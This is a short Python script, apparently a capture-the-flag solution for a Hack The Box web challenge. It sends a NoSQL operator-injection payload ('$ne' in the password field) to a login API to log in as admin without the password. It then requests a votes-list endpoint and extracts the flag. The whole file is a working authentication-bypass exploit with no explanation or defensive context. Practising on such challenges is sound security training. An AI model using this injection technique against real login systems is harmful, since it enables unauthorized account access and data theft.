import requests
import re

host, port = "94.237.120.205",39943

url = f"http://{host}:{port}"
url_login = f"{url}/api/login"
url_flag = f"{url}/api/votes/list"

session = requests.Session()

data = {
    "username": "admin",
    "password": {"$ne": "password"}
}

login = session.post(url_login,json=data)

request_flag = session.get(url_flag)

flag = re.search(r'HTB\{.*?\}', request_flag.text)

print(flag.group())